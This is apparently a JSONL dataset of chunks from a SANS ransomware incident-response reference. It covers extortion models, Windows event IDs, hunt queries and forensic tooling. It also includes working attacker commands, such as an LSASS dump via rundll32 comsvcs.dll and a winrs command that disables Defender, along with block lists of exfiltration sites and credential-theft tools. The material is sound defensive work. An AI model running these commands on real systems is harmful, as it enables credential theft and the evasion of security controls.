{"text": "The term 'ransomware' was originally used to reference the malware itself. We now call this the 'payload' or 'encryptor.' The general term 'ransomware' is now used to reference the overall attack campaign, which includes all stages of the attack. Some ransomware attacks include the deployment of a payload/encryptor, whereas others do not. These latter attacks may alternatively be referred to as 'cyber extortion.'", "metadata": {"source": "SANS_Ransomware", "title": "Overview: Ransomware and Cyber Extortion", "category": "dfir", "platform": "windows"}}
{"text": "Data Encryption - The act of encrypting data, often thereby disabling network services due to encrypted servers not being able to function correctly. Decryption is offered in return for a ransom payment.", "metadata": {"source": "SANS_Ransomware", "title": "Types of Extortion - Data Encryption", "category": "dfir", "platform": "windows"}}
{"text": "Data Exfiltration - The act of exfiltrating data from a victim organization during an attack and then using the threat of releasing that data for ransom purposes.", "metadata": {"source": "SANS_Ransomware", "title": "Types of Extortion - Data Exfiltration", "category": "dfir", "platform": "windows"}}
{"text": "Multi-Extortion - Additional extortion methods include, but are not limited to: Carrying out DDoS attacks on victim networks, Contacting suppliers/partners, Contacting regulatory bodies, Contacting board members, VIPs, investors, etc.", "metadata": {"source": "SANS_Ransomware", "title": "Types of Extortion - Multi-Extortion", "category": "dfir", "platform": "windows"}}
{"text": "Data Leak Sites (DLSs) exist to advertise that a breach has occurred and to incentivize the company to pay the ransom. Ransomware actors can choose to release victim's data or sell it. These sites typically include which company the data was taken from, the type of data available, as well as some sample data from the breach. Some DLSs also provide granular searching capabilities.", "metadata": {"source": "SANS_Ransomware", "title": "Ransomware Actor Communications - Data Leak Sites", "category": "dfir", "platform": "windows"}}
{"text": "Online forums, including those on the darknet, are often used to facilitate communications, including by threat intelligence analysts and IR professionals. Many of these can be joined anonymously. Top darknet forums include XSS.is, Exploit.in, Ransom Anon Market Place (RAMP), Hack Forums, and CryptBB.", "metadata": {"source": "SANS_Ransomware", "title": "Ransomware Actor Communications - Darknet Forums", "category": "dfir", "platform": "windows"}}
{"text": "Messaging systems like Tox, Telegram and RocketChat may be used by ransomware actors to communicate with victims.", "metadata": {"source": "SANS_Ransomware", "title": "Ransomware Actor Communications - Messaging Systems", "category": "dfir", "platform": "windows"}}
{"text": "Initial Access Broker - Obtains initial access to organizations. Monetizes networks by selling them to any actor.", "metadata": {"source": "SANS_Ransomware", "title": "RaaS Business Model - Initial Access Broker", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware Affiliate - Carries out the core attack: Execution/persistence, Privilege escalation, Defense evasion, Discovery/lateral movement, Collection/exfil, Ransomware deployment.", "metadata": {"source": "SANS_Ransomware", "title": "RaaS Business Model - Ransomware Affiliate", "category": "dfir", "platform": "windows"}}
{"text": "Data Manager - Supplies data exfiltration infrastructure and software. Sorts and organizes exfiltrated data. Publishes exfiltrated data if applicable.", "metadata": {"source": "SANS_Ransomware", "title": "RaaS Business Model - Data Manager", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware Operator - Supplies ransomware infrastructure and software.", "metadata": {"source": "SANS_Ransomware", "title": "RaaS Business Model - Ransomware Operator", "category": "dfir", "platform": "windows"}}
{"text": "Negotiator - Negotiates with victim organization.", "metadata": {"source": "SANS_Ransomware", "title": "RaaS Business Model - Negotiator", "category": "dfir", "platform": "windows"}}
{"text": "Chaser - Puts pressure on victim organizations by threatening with continuous attacks and leaking of stolen data.", "metadata": {"source": "SANS_Ransomware", "title": "RaaS Business Model - Chaser", "category": "dfir", "platform": "windows"}}
{"text": "Accountant - Launders ransom payment.", "metadata": {"source": "SANS_Ransomware", "title": "RaaS Business Model - Accountant", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware Incident Lifecycle: Phishing/Credential Harvesting -> Valid Credentials -> Internet-Exposed Service -> C2/Persistence/Defense Evasion -> Discovery -> Privilege Escalation/Credential Access -> Lateral Movement -> Data Exfiltration -> Recovery/Backup Tampering -> Data Encryption. Alternative paths include: Bruteforcing/Credential Stuffing, Exploit Vulnerability, Email -> Malicious Document -> Malware (Stage 1).", "metadata": {"source": "SANS_Ransomware", "title": "Ransomware Incident Lifecycle", "category": "dfir", "platform": "windows"}}
{"text": "The purpose of RDP in organizations: To facilitate remote access to systems. Issues with RDP: Many organizations leave RDP open on Internet-facing devices. Weak password policies and no Multi-Factor Authentication (MFA) enabled make brute forcing easier. No lockout policies means threat actors are not locked out when attempting to gain access. Many organizations don't recognize the threat.", "metadata": {"source": "SANS_Ransomware", "title": "RDP as an Infection Vector - Issues", "category": "dfir", "platform": "windows"}}
{"text": "Methods of access for an attacker via RDP: Password spraying and brute force attacks, Credential stuffing, Credential harvesting, Purchased access or credentials.", "metadata": {"source": "SANS_Ransomware", "title": "RDP as an Infection Vector - Attack Methods", "category": "dfir", "platform": "windows"}}
{"text": "It is much more common for ransomware actors to exploit common CVEs than zero-day vulnerabilities. CVEs are a threat because: Software patching cycles are too long. Asset management of hardware and software is lacking. Orphaned or abandoned services or hosts can remain on networks. Vulnerability management is insufficient and assets often remain unpatched. Many teams do not create or maintain Bill of Materials (BOM) for products and/or monitor for vulnerabilities in third-party libraries.", "metadata": {"source": "SANS_Ransomware", "title": "Software Exploitation as an Infection Vector", "category": "dfir", "platform": "windows"}}
{"text": "Identifying Vulnerability Exploitation: Malicious processes run under the context of an exploited process - Look for processes serving as the parent for unrelated worker processes. Working directory from which a malicious process is run can be related to exploited software - Look for a process running from an unusual directory; likely the working directory for the parent process (e.g., Malware written to C:\\Windows\\System32\\inetsrv\\). Malicious process(es) running under a service account context - Look for instances of accounts associated with non-expected processes (e.g., A malicious process running as svc-iis). Use firewall/edge logs for temporal correlation.", "metadata": {"source": "SANS_Ransomware", "title": "Identifying Vulnerability Exploitation", "category": "dfir", "platform": "windows"}}
{"text": "Phishing is one of the most common infection vectors for ransomware campaigns, aiming to either deliver malware or harvest credentials. Common Threats - Attachments: Often malicious documents (maldocs), but can come in many forms.", "metadata": {"source": "SANS_Ransomware", "title": "Phishing as an Infection Vector", "category": "dfir", "platform": "windows"}}
{"text": "Phishing Links - Often to cloud sharing, credential harvesting, drive-by, or exploit kit websites. Types of link: Domain-based, IP-based, URL shortener. Create an approved list of file sharing sites, and block + alert on those not included.", "metadata": {"source": "SANS_Ransomware", "title": "Phishing Links", "category": "dfir", "platform": "windows"}}
{"text": "Phishing Analysis - Passive analysis using VirusTotal domain/IP search. Do not search for the full URL or upload any files. Active analysis: Sites like VirusTotal and urlscan.io. Commands such as curl or wget via Tor.", "metadata": {"source": "SANS_Ransomware", "title": "Phishing Analysis", "category": "dfir", "platform": "windows"}}
{"text": "Query to hunt phishing activity - Office applications as parent processes for malicious activity: (source_name:\"Microsoft-Windows-Sysmon\" AND event_id:1) AND process_parent_path:(*winword.exe OR *excel.exe OR *powerpnt.exe OR *mspub.exe OR *visio.exe)", "metadata": {"source": "SANS_Ransomware", "title": "Phishing Hunt Query - Office Parent Processes", "category": "dfir", "platform": "windows"}}
{"text": "Query to hunt phishing activity - Zip files opened in Windows (using Sysmon): (source_name:\"Microsoft-Windows-Sysmon\" AND event_id:1) AND process_parent_command_line:\"appdata\\\\local\\\\temp\\\\temp1_*\"", "metadata": {"source": "SANS_Ransomware", "title": "Phishing Hunt Query - Zip Files", "category": "dfir", "platform": "windows"}}
{"text": "Query to hunt phishing activity - Reading of stored credentials for Zip files accessed: source_name:\"Microsoft-Windows-Security-Auditing\" AND event_id:5379 AND credentials_read:Microsoft_Windows_Shell_ZipFolder*", "metadata": {"source": "SANS_Ransomware", "title": "Phishing Hunt Query - Zip Credentials", "category": "dfir", "platform": "windows"}}
{"text": "Query to hunt phishing activity - Files written by Outlook: (source_name:\"Microsoft-Windows-Sysmon\" AND event_id:11) AND process_name:\"outlook.exe\"", "metadata": {"source": "SANS_Ransomware", "title": "Phishing Hunt Query - Outlook Files", "category": "dfir", "platform": "windows"}}
{"text": "Query to hunt phishing activity - Search for Trust Records in the Registry: (source_name:\"Microsoft-Windows-Sysmon\" AND event_id:13) AND registry_key_path:(\"Trusted Documents\" OR \"TrustRecords\")", "metadata": {"source": "SANS_Ransomware", "title": "Phishing Hunt Query - Trust Records", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Security Event Log: Event ID 4624, 4625 - Logon/logoff. Pay special attention to Type 3 (Network) and 10 (RDP) events.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - Security Logon Events", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Security Event Log: Event ID 4778, 4779 - Session reconnect/disconnect.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - Session Reconnect", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Security Event Log: Event ID 5156 - Windows filtering permitted a connection. Includes process name.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - Windows Filtering", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Microsoft-Windows-RemoteDesktopServices-RdpCoreTS\\Operational: Event ID 98, 131 - Identify established network connectivity. ID 131 may include remote IP.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - RdpCoreTS Events", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Microsoft-Windows-TerminalServices-RemoteConnectionManager\\Operational: Event ID 1149 - RDP auth successful (in Win7+).", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - RemoteConnectionManager 1149", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Microsoft-Windows-TerminalServices-RemoteConnectionManager\\Operational: Event ID 261 - Denotes RDP attempts (even without auth!).", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - RemoteConnectionManager 261", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Microsoft-Windows-TerminalServices-LocalSessionManager\\Operational: Event ID 21, 22 - RDP successful logon. Both include username.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - LocalSessionManager Logon", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Microsoft-Windows-TerminalServices-LocalSessionManager\\Operational: Event ID 23 - RDP logoff. Includes username.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - LocalSessionManager Logoff", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Microsoft-Windows-TerminalServices-LocalSessionManager\\Operational: Event ID 24, 25 - RDP disconnect/reconnect events.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - LocalSessionManager Disconnect", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Destination Host Event Logs - Microsoft-Windows-TerminalServices-LocalSessionManager\\Operational: Event ID 39, 40 - RDP disconnect. ID 40 may indicate reconnect.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Tracking - LocalSessionManager Events 39 40", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Source Host Event Logs - Sysmon: Event ID 1, 5 - Process creation/termination (e.g., mstsc.exe).", "metadata": {"source": "SANS_Ransomware", "title": "RDP Source Host - Sysmon Process", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Source Host Event Logs - Security: Event ID 4688, 4689 - Process creation/termination (e.g., mstsc.exe).", "metadata": {"source": "SANS_Ransomware", "title": "RDP Source Host - Security Process", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Source Host Event Logs - Security: Event ID 4648 - Indicates explicit credential use (e.g., RunAs). Helps identify source and target accounts being used. It is not specific to RDP but useful for correlation.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Source Host - Explicit Credentials", "category": "dfir", "platform": "windows"}}
{"text": "Tracking RDP Activity In Source Host Event Logs - Microsoft-Windows-TerminalServices-RDPClient\\Operational: Event ID 1024, 1102 - RDP client activity. 1024 provides remote hostname. 1102 provides remote IP. These are very handy for tracking internal to internal RDP.", "metadata": {"source": "SANS_Ransomware", "title": "RDP Source Host - RDPClient Events", "category": "dfir", "platform": "windows"}}
{"text": "Query to hunt RDP activity - Hunt for successful remote logins: data_type:\"windows:evtx:record\" AND source_name:\"Microsoft-Windows-Security-Auditing\" AND event_identifier:4624 AND (logon_type:3 OR logon_type:10) AND ip_address:* AND NOT (ip_address:/10\\..*/ OR ip_address:\"127.0.0.1\")", "metadata": {"source": "SANS_Ransomware", "title": "RDP Hunt Query - Successful Logins", "category": "dfir", "platform": "windows"}}
{"text": "Query to hunt RDP activity - Hunt for failed remote logins: data_type:\"windows:evtx:record\" AND source_name:\"Microsoft-Windows-Security-Auditing\" AND event_identifier:4625 AND (logon_type:3 OR logon_type:10) AND ip_address:* AND NOT (ip_address:/10\\..*/ OR ip_address:\"127.0.0.1\")", "metadata": {"source": "SANS_Ransomware", "title": "RDP Hunt Query - Failed Logins", "category": "dfir", "platform": "windows"}}
{"text": "Artifacts to Collect: Windows Event Logs, System logs from an Endpoint Detection & Response (EDR) system if you have one in the environment, File and Folder Access artifacts, NTFS metadata, Registry Hives, Evidence of Application Execution, Web Browser artifacts, Persistence Mechanisms, Application logs, SRUM, User Audit Logs (UAL), Firewall/Edge logs, VPN logs, Citrix/VMWare logs, Cloud logs, Web logs, Email logs, DNS logs, Database logs.", "metadata": {"source": "SANS_Ransomware", "title": "Artifacts to Collect", "category": "dfir", "platform": "windows"}}
{"text": "List environment variables accessible by the current account logged-in on the system: Command prompt: set. PowerShell: ls env:", "metadata": {"source": "SANS_Ransomware", "title": "Environment Variables Commands", "category": "dfir", "platform": "windows"}}
{"text": "Example collection and parsing process with KAPE: Execute KAPE as follows: .\\kape.exe --tsource C:\\ --tdest C:\\sans_collect --target !SANS_Triage --zip collection", "metadata": {"source": "SANS_Ransomware", "title": "KAPE Collection Command", "category": "dfir", "platform": "windows"}}
{"text": "Execute MFTECmd as follows: .\\MFTECmd.exe --body C:\\sans_collect --bodyf .\\collection.mft.bodyfile --bdl C -f \"C:\\sans_collect\\$MFT\"", "metadata": {"source": "SANS_Ransomware", "title": "MFTECmd Parsing Command", "category": "dfir", "platform": "windows"}}
{"text": "In Linux with Plaso, Elasticsearch, and TimeSketch installed: log2timeline.py --parsers '!mft,!usnjrnl,!filestat' --hashers md5 --status_view window --storage-file ./collection.plaso ./C", "metadata": {"source": "SANS_Ransomware", "title": "Log2Timeline Command", "category": "dfir", "platform": "linux"}}
{"text": "Import to TimeSketch: timesketch_importer --host http://127.0.0.1:[PORT] --index_name collection_1 --sketch_name collection_1 --timeline_name collection_host ./collection.plaso", "metadata": {"source": "SANS_Ransomware", "title": "TimeSketch Import Command", "category": "dfir", "platform": "linux"}}
{"text": "Local Security Authority Subsystem Service (LSASS) authenticates users within the system. During boot, wininit.exe launches %SystemRoot%\\System32\\lsass.exe. Credentials are then stored in virtual memory pages mapped to the lsass.exe process, meaning threat actors often try to dump these pages and conduct offline brute forcing to get passwords and/or hashes.", "metadata": {"source": "SANS_Ransomware", "title": "LSASS Dumping Overview", "category": "dfir", "platform": "windows"}}
{"text": "LSASS attacks may be more successful if: WDigest is enabled in the environment, meaning cleartext passwords may be stored in memory instead of password hashes. Enablement of WDigest: SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest\\UseLogonCredential = 1", "metadata": {"source": "SANS_Ransomware", "title": "LSASS - WDigest Enabled", "category": "dfir", "platform": "windows"}}
{"text": "LSASS attacks may be more successful if: Insecure versions of New Technology LAN Manager (NTLM) are enabled in the environment (disable NTLMv1!). Credential Guard is not enabled in Active Directory. Protected Users isn't used in Active Directory.", "metadata": {"source": "SANS_Ransomware", "title": "LSASS Attack Conditions", "category": "dfir", "platform": "windows"}}
{"text": "LSASS Detection: Mimikatz can implement Pass-the-Hash (PtH) attacks to authenticate without requiring a cleartext password. Many memory-dumping tools will dump the LSASS memory pages as 'lsass.dmp'.", "metadata": {"source": "SANS_Ransomware", "title": "LSASS Detection - Mimikatz", "category": "dfir", "platform": "windows"}}
{"text": "LSASS Dumping Tools: Windows Task Manager (Uses an upper-case suffix e.g., lsass.DMP), SysInternals Process Explorer, SysInternals ProcDump, SQLDumper.exe (part of MS SQL/Office), Process Hacker, PowerSploit's Out-MiniDump cmdlet, comsvcs.dll invoked via rundll32.exe.", "metadata": {"source": "SANS_Ransomware", "title": "LSASS Dumping Tools", "category": "dfir", "platform": "windows"}}
{"text": "LSASS dump using comsvcs.dll: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [LSASS_process_ID] C:\\windows\\temp\\lsass.dmp full", "metadata": {"source": "SANS_Ransomware", "title": "LSASS Dump via comsvcs.dll", "category": "dfir", "platform": "windows"}}
{"text": "Active Directory (AD) Database for Credential Cracking: NTDS.dit - Includes password hashes for computer, user, service, and other accounts (also possibly cleartext LAPS passwords). AD database file expected locations: C:\\Windows\\NTDS\\NTDS.dit, C:\\Windows\\WinSxS\\*\\NTDS.dit. Search for NTDS.dit files outside expected locations.", "metadata": {"source": "SANS_Ransomware", "title": "NTDS.dit Credential Cracking", "category": "dfir", "platform": "windows"}}
{"text": "The most common methods used for lateral movement include: Server Message Block (SMB) - Common tools: SysInternals PsExec and Impacket smbexec.", "metadata": {"source": "SANS_Ransomware", "title": "Lateral Movement - SMB", "category": "dfir", "platform": "windows"}}
{"text": "Lateral Movement - Remote Desktop Protocol (RDP): Note that users must be in the 'Remote Desktop Users' group to use RDP. Look for Event ID 4728 - A member was added to a security enabled global group (For the above group).", "metadata": {"source": "SANS_Ransomware", "title": "Lateral Movement - RDP", "category": "dfir", "platform": "windows"}}
{"text": "Lateral Movement - Windows Remote Management (WinRM): Most common implementation in ransomware campaigns is the Windows Remote Shell (WinRS) utility: C:\\Windows\\[System32|SysWOW64]\\winrs.exe. Example command: winrs -r:<remote host> /username:<username> /password:<password> \"powershell.exe -nop -nol -c Set-MpPreference -DisableRealtimeMonitoring 1\"", "metadata": {"source": "SANS_Ransomware", "title": "Lateral Movement - WinRM", "category": "dfir", "platform": "windows"}}
{"text": "Lateral Movement methods also include: Background Intelligent Transfer Service (BITS), Windows Management Instrumentation (WMI).", "metadata": {"source": "SANS_Ransomware", "title": "Lateral Movement - BITS and WMI", "category": "dfir", "platform": "windows"}}
{"text": "Before lateral movement can occur, threat actors must scan to determine where to move to. When scanning a network, the output of tools is often written to a text file with a single character filename. Look for these, plus scan.xml, which is the default filename for some tools.", "metadata": {"source": "SANS_Ransomware", "title": "Network Scanning Before Lateral Movement", "category": "dfir", "platform": "windows"}}
{"text": "Common Scanning tools: Advanced IP Scanner (When run, tool will make call to www.advanced-ip-scanner.com/checkupdate.php, so check for this in logs. Details on use may be in: HKCU\\Software\\Famatech\\advanced_ip_scanner\\State), Advanced Port Scanner, Angry IP Scanner, Cobalt Strike (built-in scanning), KPort Scanner, nmap, Qfinder Pro, SoftPerfect Network Scanner (netscan.exe).", "metadata": {"source": "SANS_Ransomware", "title": "Common Scanning Tools", "category": "dfir", "platform": "windows"}}
{"text": "Detecting and Hunting PsExec: Process creation Event IDs 4688/4689 - Sysmon Event IDs 1/5: Source: PSEXEC.exe, Dest: PSEXESVC.exe. File creations (e.g., Sysmon Event ID 11) for the above files. Event IDs 7045/7036 for service name: PSEXESVC.", "metadata": {"source": "SANS_Ransomware", "title": "PsExec Detection - Process and Service Events", "category": "dfir", "platform": "windows"}}
{"text": "PsExec Detection: Registry key that stores End-User License Agreement acceptance: HK_USERS\\[SID]\\Software\\Sysinternals\\PsExec\\EulaAccepted", "metadata": {"source": "SANS_Ransomware", "title": "PsExec Detection - EULA Registry Key", "category": "dfir", "platform": "windows"}}
{"text": "PsExec Detection: Key files written to C:\\Windows on the target system upon execution. PsExec key files naming syntax: C:\\Windows\\PSEXEC-[Source Hostname]-[8 Unique Characters].key. PsExec key files can be found in the UsnJrnl.", "metadata": {"source": "SANS_Ransomware", "title": "PsExec Detection - Key Files", "category": "dfir", "platform": "windows"}}
{"text": "RDP session cached bitmaps (for parsing, see https://for528.com/rdp-cache): (Win 7+) C:\\Users\\[user]\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\*. (pre Win7) C:\\Documents and Settings\\[user]\\Local Settings\\Application Data\\Microsoft\\Terminal Server Client\\Cache\\*", "metadata": {"source": "SANS_Ransomware", "title": "RDP Session Cached Bitmaps", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware actors do many bad things using %COMSPEC%, which points to the command line interpreter (CLI) to run commands - hunt for this! %COMSPEC% /c [command], %COMSPEC% /k [command]", "metadata": {"source": "SANS_Ransomware", "title": "Hunting COMSPEC Usage", "category": "dfir", "platform": "windows"}}
{"text": "Common pattern used by Cobalt Strike: %COMSPEC% /c echo 5f133503c8d > \\\\.\\pipe\\c73645. Searching for such patterns: Regex: ^.*COMSPEC.*echo.*pipe.*$. General: \"\\%COMSPEC\\%\" AND echo AND pipe", "metadata": {"source": "SANS_Ransomware", "title": "Cobalt Strike COMSPEC Pattern", "category": "dfir", "platform": "windows"}}
{"text": "Hunt for well-known tools: bcdedit, vssadmin, wbadmin. LSASS dumps - look for 'lsass.dmp' being created.", "metadata": {"source": "SANS_Ransomware", "title": "Hunt for Well-Known Tools", "category": "dfir", "platform": "windows"}}
{"text": "Known process names used for malicious purposes: explorer, iexplore, lsass, mimikatz, Metasploit, processhacker, rundll32, sharphound, svchost, winlogon.", "metadata": {"source": "SANS_Ransomware", "title": "Malicious Process Names", "category": "dfir", "platform": "windows"}}
{"text": "Looking for PEs in all the wrong places - EXE files written to: Admin shares: $IPC, $ADMIN, $C. %APPDATA%, %LOCALAPPDATA%, %LOCALAPPDATA%\\Temporary Internet Files, %ProgramData%, %TEMP%, %USERPROFILE%\\Pictures, %USERPROFILE%\\Music, %USERPROFILE%\\Videos, C:\\$Recycle.Bin, C:\\Perflogs, C:\\Users\\Public.", "metadata": {"source": "SANS_Ransomware", "title": "Suspicious EXE Locations", "category": "dfir", "platform": "windows"}}
{"text": "Hunt in anti-virus/EPP logs for strings that might reveal ransomware actor actions or tools: hacktool, htool, hktl, dualuse, dual, pstools, sysinternals, PUP, PUA.", "metadata": {"source": "SANS_Ransomware", "title": "AV Log Hunt Strings", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - Avast: %ProgramData%\\AVAST Software\\Avast\\log\\*, %ProgramData%\\AVAST Software\\Persistent Data\\Avast\\Logs\\*, %PROGRAMFILES(x86)%\\AVAST Software\\Business Agent\\log.txt, %PROGRAMFILES(x86)%\\AVAST Software\\Business Agent\\smbpol.db", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - Avast", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - AVG: %ProgramData%\\AVG\\Antivirus\\log\\*, %ProgramData%\\AVG\\Antivirus\\report\\*, %ProgramData%\\AVG\\Persistent Data\\Antivirus\\Logs\\", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - AVG", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - Bitdefender: %ProgramData%\\Bitdefender\\Endpoint Security\\Logs\\*, %ProgramData%\\Bitdefender\\Desktop\\Profiles\\Logs\\*, %PROGRAMFILES%\\Bitdefender*\\*", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - Bitdefender", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - ESET: %ProgramData%\\ESET\\ESET NOD32 Antivirus\\Logs\\*", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - ESET", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - F-Secure: %ProgramData%\\F-Secure\\Log\\*, %ProgramData%\\F-Secure\\Antivirus\\ScheduledScanReports\\*, %USERPROFILE%\\AppData\\Local\\F-Secure\\Log\\*", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - F-Secure", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - McAfee: %ProgramData%\\McAfee\\DesktopProtection\\*, %ProgramData%\\McAfee\\Endpoint Security\\Logs\\*, %ProgramData%\\McAfee\\Endpoint Security\\Logs_Old\\*, %ProgramData%\\Mcafee\\VirusScan\\*", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - McAfee", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - Sophos: %ProgramData%\\Sophos\\Sophos*\\Logs\\*", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - Sophos", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - Trend Micro: %ProgramData%\\Trend Micro\\*, %PROGRAMFILES%\\Trend Micro\\Security Agent\\ConnLog\\*, %PROGRAMFILES%\\Trend Micro\\Security Agent\\Report\\*", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - Trend Micro", "category": "dfir", "platform": "windows"}}
{"text": "Antivirus log locations - Windows Defender: %ProgramData%\\Microsoft\\Microsoft AntiMalware\\Support\\*, %ProgramData%\\Microsoft\\Windows Defender\\Support\\*, %ProgramData%\\Microsoft\\Windows Defender\\Quarantine*, %SYSTEMROOT%\\Temp\\MpCmdRun.log", "metadata": {"source": "SANS_Ransomware", "title": "AV Logs - Windows Defender", "category": "dfir", "platform": "windows"}}
{"text": "Ransomware actors have moved away from custom, specially crafted tools, and over to more readily available tools: Free and open-source software (Bloodhound, WinSCP, PoshC2, Empire, AdFind). Other threat actor's scripts (Operators often steal and/or adapt one another's scripts). Living Off the Land Binaries and Scripts (LOLBAS). Red teaming, adversary simulation, and emulation tools (Cobalt Strike, Brute Ratel). Malware as a Service (MaaS) (e.g., Infostealers such as FormBook, Redline).", "metadata": {"source": "SANS_Ransomware", "title": "Ransomware Actor Tooling Overview", "category": "dfir", "platform": "windows"}}
{"text": "When ransomware actors use a bring-your-own-tools (BYOT) approach, this is often facilitated by cloud-based file sharing websites, and they often download tools to the victim network.", "metadata": {"source": "SANS_Ransomware", "title": "BYOT Approach", "category": "dfir", "platform": "windows"}}
{"text": "Common sites to BLOCK and on which to ALERT: anonfiles.com, dropmefiles.com, file.io, mega.io, mega.nz, qaz.im, temp.sh, termbin.com, transfer.sh, ufile.io", "metadata": {"source": "SANS_Ransomware", "title": "Sites to Block and Alert", "category": "dfir", "platform": "windows"}}
{"text": "Common sites on which to ALERT: 7zip: 7-zip.org/download.html, AdFind: joeware.net/freetools/tools/adfind/index.htm, Advanced IP Scanner: advanced-ip-scanner.com/download, Angry IP Scanner: angryip.org/download/#windows, AnyDesk: anydesk.com/en/downloads", "metadata": {"source": "SANS_Ransomware", "title": "Tool Download Sites to Alert - Part 1", "category": "dfir", "platform": "windows"}}
{"text": "Common sites on which to ALERT: Procdump: docs.microsoft.com/en-us/sysinternals/downloads/procdump, Process Hacker: processhacker.sourceforge.io/downloads.php, PsTools/PsExec: docs.microsoft.com/en-us/sysinternals/downloads/psexec, rclone: rclone.org/downloads, WinSCP Portable: winscp.net/eng/downloads.php#additional, WinSCP (full): winscp.net/eng/download.php", "metadata": {"source": "SANS_Ransomware", "title": "Tool Download Sites to Alert - Part 2", "category": "dfir", "platform": "windows"}}
{"text": "GitHub repos on which to ALERT: Bloodhound: github.com/BloodHoundAD/BloodHound/releases, Lazagne: github.com/AlessandroZ/LaZagne/releases, Mimikatz: github.com/gentilkiwi/mimikatz/releases, PowerSploit/PowerView: github.com/PowerShellMafia/PowerSploit/releases, PowerView/PowerUp (inc. ShareFinder.ps1): github.com/darkoperator/Veil-PowerView", "metadata": {"source": "SANS_Ransomware", "title": "GitHub Repos to Alert - Part 1", "category": "dfir", "platform": "windows"}}
{"text": "GitHub repos on which to ALERT: Rubeus: github.com/GhostPack/Rubeus, Binary: github.com/r3motecontrol/Ghostpack-CompiledBinaries, Seatbelt: github.com/GhostPack/Seatbelt, Binary: github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe, SharpView: github.com/tevora-threat/SharpView/tree/master/Compiled", "metadata": {"source": "SANS_Ransomware", "title": "GitHub Repos to Alert - Part 2", "category": "dfir", "platform": "windows"}}
{"text": "RMM tools are increasingly leveraged by ransomware actors. These commercial tools are often easy to find, as they are typically registered in the Add/Remove Programs section in Windows. Have an approved list - BLOCK & HUNT anything not on the approved list.", "metadata": {"source": "SANS_Ransomware", "title": "RMM Tools Overview", "category": "dfir", "platform": "windows"}}
{"text": "RMM Tool - AnyDesk Log files: %PROGRAMDATA%\\AnyDesk\\connection_trace.txt, %PROGRAMDATA%\\AnyDesk\\ad_svc.trace, %APPDATA%\\AnyDesk\\ad.trace", "metadata": {"source": "SANS_Ransomware", "title": "RMM Tool Artifacts - AnyDesk", "category": "dfir", "platform": "windows"}}
{"text": "RMM Tool - Atera Log file: %PROGRAMFILES%\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageRunCommandInteractive\\log.txt. WEL services added: HKLM\\SYSTEM\\ControlSet001\\Services\\EventLog\\Application\\AlphaAgent, HKLM\\SYSTEM\\ControlSet001\\Services\\EventLog\\Application\\AteraAgent", "metadata": {"source": "SANS_Ransomware", "title": "RMM Tool Artifacts - Atera", "category": "dfir", "platform": "windows"}}
{"text": "RMM Tool - ConnectWise (formerly ScreenConnect) Log and important file locations: %SYSTEMROOT%\\temp\\screenconnect\\[version]\\, %PROGRAMDATA%\\ScreenConnect Client ([fingerprint])\\, %PROGRAMFILES(x86)%\\ScreenConnect Client ([fingerprint])\\, %USERPROFILE%\\Documents\\ConnectWiseControl\\Files\\, %USERPROFILE%\\Documents\\ConnectWiseControl\\captures\\", "metadata": {"source": "SANS_Ransomware", "title": "RMM Tool Artifacts - ConnectWise", "category": "dfir", "platform": "windows"}}
